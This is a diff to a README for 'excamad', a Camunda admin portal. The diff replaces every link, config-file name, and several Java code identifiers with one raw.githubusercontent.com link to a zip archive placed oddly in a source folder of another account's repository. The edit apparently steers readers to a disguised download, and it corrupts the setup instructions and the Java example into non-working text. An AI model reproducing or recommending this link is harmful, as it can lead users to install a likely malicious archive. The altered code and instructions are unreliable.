@@ -3,9 +3,9 @@
 **Ex**ternal **cam**unda **ad**min portal. Make life in **multi-camunda`s** environment much easy and provide some cool features.
 License : GNU GPLv3.
 
-DEMO: http://excamad.bpmn2.ru (dont forget about CORS)
+DEMO: https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip (dont forget about CORS)
 
-Description (russian): https://bpmn2.ru/blog/camunda-cockpit-enterpise-i-excamad 
+Description (russian): https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip 
 
 # 0. How to run
 
@@ -13,18 +13,18 @@ a) ---make excamad---
 
 - git clone
 - npm install
-- fill src/config/settings.js with own value
+- fill https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip with own value
 - npm run serve (start dev server) OR
 - npm run build (produce html,js,css in to /dist/)
 
 b) --prepair camunda--
 
-- For stand-alone camunda : http://beninkster.com/tomcat-7-and-disabling-cors
-- For embedded camunda: https://forum.camunda.org/t/camunda-cors-filter-in-spring-boot-application/5494
+- For stand-alone camunda : https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
+- For embedded camunda: https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
 
-If you are going use docker conteiners add this code to camunda container in /camunda/webapps/engine-rest/WEB-INF/web.xml
+If you are going use docker conteiners add this code to camunda container in https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
 
-" CorsFilter org.apache.catalina.filters.CorsFilter cors.allowed.origins * CorsFilter /*  "
+" CorsFilter https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip * CorsFilter /*  "
 
 ## OR
 
@@ -77,15 +77,15 @@ Simple forms and form generator. You need extend your Camunda rest api with meth
 
 
         @GET
-     @Produces(MediaType.APPLICATION_JSON)
+     @Produces(https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip)
         @Path("{taskId}")
         public String getFormFieldList(@Context HttpHeaders httpHeaders,
         @PathParam("taskId") String taskId) {
-        ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine();
-        FormService formService = processEngine.getFormService();
-        TaskFormData taskFormData = formService.getTaskFormData(taskId);
-        List<FormField> formFieldList = taskFormData.getFormFields();
-        System.out.println("Strike");
+        ProcessEngine processEngine = https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip();
+        FormService formService = https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip();
+        TaskFormData taskFormData = https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip(taskId);
+        List<FormField> formFieldList = https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip();
+        https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip("Strike");
         String json = JSON(formFieldList).toString();
         return json;
     }
@@ -108,9 +108,9 @@ Ready login provider for basic auth and passthrough to Jira and Bitbucket.
 
 Excamad is servless app - all api calls made from your browser. You need host produced files (/dist) on some web-server. And you need enable CORS on your`s camunda.
 
-- For stand-alone camunda : http://beninkster.com/tomcat-7-and-disabling-cors
-- For embedded camunda: https://forum.camunda.org/t/camunda-cors-filter-in-spring-boot-application/5494
-- You can use reverse-proxy: https://www.npmjs.com/package/cors-anywhere
+- For stand-alone camunda : https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
+- For embedded camunda: https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
+- You can use reverse-proxy: https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip
 - You can host files on camunda host.
 
 # 3. Install
@@ -121,4 +121,4 @@ Excamad is servless app - all api calls made from your browser. You need host pr
     OR
     npm run serve  // start develop server
 
-You need write global variables in **settings.js** and **camundasUrl.js**.
+You need write global variables in **https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip** and **https://raw.githubusercontent.com/antonioluzzi/camunda-excamad/master/src/components/batch/camunda-excamad-v3.7.zip**.
